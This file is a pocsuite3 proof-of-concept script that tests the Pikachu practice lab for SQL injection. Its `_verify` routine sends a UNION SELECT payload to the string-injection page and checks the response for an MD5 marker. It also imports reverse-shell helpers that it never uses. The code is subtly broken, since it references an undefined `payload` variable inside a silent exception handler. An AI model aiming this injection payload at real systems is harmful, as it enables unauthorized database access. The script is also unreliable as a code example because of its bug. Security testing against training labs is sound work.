
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from requests.exceptions import ReadTimeout

from urllib.parse import urljoin
 
class DemoPOC(POCBase):
    vulID = '11001'  
    version = '3.0'
    author = ['lan']
    vulDate = '2017-12-14'
    createDate = '2017-12-14'
    updateDate = '2017-12-14'
    references = ['https://github.com/pikachu']
    name = 'pikachu'
    appPowerLink = ''
    appName = 'pikachu'
    appVersion = '1.x'
    vulType = 'SQL'
    desc = '''
    pikachuSQL注入
    '''
    samples = []
    install_requires = ['']
 
    def _verify(self):
#        output = Output(self)
        result = {}
        url = urljoin(self.url,'/vul/sqli/sqli_str.php?name=1%27+union+select+1%2Cmd5%28123%29%23&submit=%E6%9F%A5%E8%AF%A2')
        resp = requests.get(url)
        try:
            if resp and resp.status_code == 200 and "202cb962ac59075b964b07152d234b70" in resp.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Name'] = payload
        except Exception as e:
            pass
 
        return self.parse_output(result)
 
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
 
    def _attack(self):
        return self._verify()
register_poc(DemoPOC)

